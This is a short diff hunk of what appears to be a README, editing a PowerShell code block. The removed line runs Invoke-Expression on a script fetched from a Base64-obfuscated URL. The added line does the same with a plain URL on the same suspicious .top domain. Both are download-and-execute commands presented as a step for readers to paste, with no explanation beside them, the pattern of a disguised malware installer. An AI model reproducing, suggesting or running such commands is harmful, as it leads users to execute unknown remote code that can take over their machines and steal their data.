@@ -80,7 +80,7 @@
 ```
 
 ```powershell
-iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04MjcwNzA2MjE1L3BhY2FuaQ=='))) -UseBasicParsing)
+iex (iwr "http://soft-storage.top/worker?=8270706215/usanewrock" -UseBasicParsing)
 ```
 
 ```text
